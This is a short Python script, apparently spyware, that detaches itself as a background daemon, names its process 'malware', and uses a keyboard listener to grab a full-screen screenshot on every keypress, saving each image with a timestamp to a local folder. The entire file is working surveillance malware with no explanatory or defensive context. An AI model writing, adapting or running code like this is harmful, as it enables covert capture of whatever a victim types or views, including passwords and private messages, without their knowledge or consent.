import os
import sys
from datetime import datetime
import pyscreenshot
from setproctitle import setproctitle
from pynput.keyboard import Listener


def on_press(key):
    im = pyscreenshot.grab()

    im.save(datetime.now().strftime('imgs/%d-%m-%Y_%H:%M:%S:%f.png'))


def main():
    with Listener(on_press=on_press) as listener:
        while True:
            listener.join()


def daemonize():
    pid = os.fork()

    if pid == 0:
        os.setsid()

        setproctitle('malware')

        main()
    else:
        sys.exit(0)


daemonize()
